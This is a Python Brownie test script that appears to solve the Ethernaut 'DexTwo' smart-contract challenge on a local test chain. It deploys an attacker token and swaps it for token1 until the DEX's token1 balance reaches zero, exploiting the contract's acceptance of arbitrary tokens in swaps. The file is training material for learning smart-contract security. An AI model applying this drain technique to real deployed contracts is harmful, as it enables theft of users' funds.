from brownie import accounts, DexTwo, DexTwoAttack, SwappableTokenTwo
from scripts.helpful_scripts import get_account


def test_dex2():
    """
    The main idea is:
        - Create AttackerToken with 210 tokens
        - Approve 100 tokens from attackertoken/account to dextwo.
        - Transfer 100 from attackertoken/account to dextwo contract
        - Swap 100 attackertokens to token1.
        - Token1 will be 0.
    """
    account = get_account()
    # DexTwo Deploy
    dextwo = DexTwo.deploy({"from": account})
    token1 = SwappableTokenTwo.deploy(
        dextwo.address, "token1", "t1", 110, {"from": account}
    )
    token2 = SwappableTokenTwo.deploy(
        dextwo.address, "token2", "t1", 110, {"from": account}
    )
    dextwo.setTokens(token1.address, token2.address, {"from": account})
    print(f"Token1: {token1.address} Token2: {token2.address}")

    # Approve/Transfer/Balance token1 and token2
    # Approve account.address to transfer to dextwo balance
    token1.approve(account.address, 100, {"from": account})
    token2.approve(account.address, 100, {"from": account})
    # Transfer 10 to dextwo balance
    token1.transferFrom(account.address, dextwo.address, 100, {"from": account})
    token2.transferFrom(account.address, dextwo.address, 100, {"from": account})

    # Token1 in dextwo contract should be 100
    assert token1.balanceOf(dextwo.address) == 100

    print(
        f"""
Balance of Token1 in dextwo: {token1.balanceOf(dextwo.address)}
Balance of Token2 in dextwo: {token2.balanceOf(dextwo.address)}
Balance of Token1 in Account0 {account.address} balance: {token1.balanceOf(account.address)}
Balance of Token2 in Account0 {account.address} balance: {token2.balanceOf(account.address)}
"""
    )

    # DexTwoAttack deploy. This is my new attackertoken
    attackertoken = DexTwoAttack.deploy(210, {"from": accounts[1]})
    # Approve accounts1 to move 10 tokens to dextwo.
    # IMPORTANT We need to transfer attackertoken in dextwo contract
    attackertoken.approve(accounts[1].address, 100, {"from": accounts[1]})
    attackertoken.transferFrom(
        accounts[1].address, dextwo.address, 100, {"from": accounts[1]}
    )
    print(
        f"""
Balance of AttackerToken in Account1 {accounts[1]} balance: {attackertoken.balanceOf(accounts[1])}
Balance of AttackerToken in Dextwo: {attackertoken.balanceOf(dextwo.address)}
Balance of Token1 in dextwo: {token1.balanceOf(dextwo.address)}
Balance of Token1 in Account1 {account.address} balance: {token1.balanceOf(accounts[1].address)}
"""
    )

    # Swap attackertoken to token1
    # Approve dextwo to swap 10 tokens
    attackertoken.approve(dextwo.address, 100, {"from": accounts[1]})
    dextwo.swap(attackertoken.address, token1.address, 100, {"from": accounts[1]})
    print(
        f"""
Swapping 10 AttackerTokens to Token1...
Balance of AttackerToken in Account1 {accounts[1]} balance: {attackertoken.balanceOf(accounts[1])}
Balance of AttackerToken in Dextwo: {attackertoken.balanceOf(dextwo.address)}
Balance of Token1 in dextwo: {token1.balanceOf(dextwo.address)}
Balance of Token1 in Account1 {account.address} balance: {token1.balanceOf(accounts[1].address)}
"""
    )

    # Token 1 in dextwo contract should be 0. Drain the token1 balance.
    assert token1.balanceOf(dextwo.address) == 0
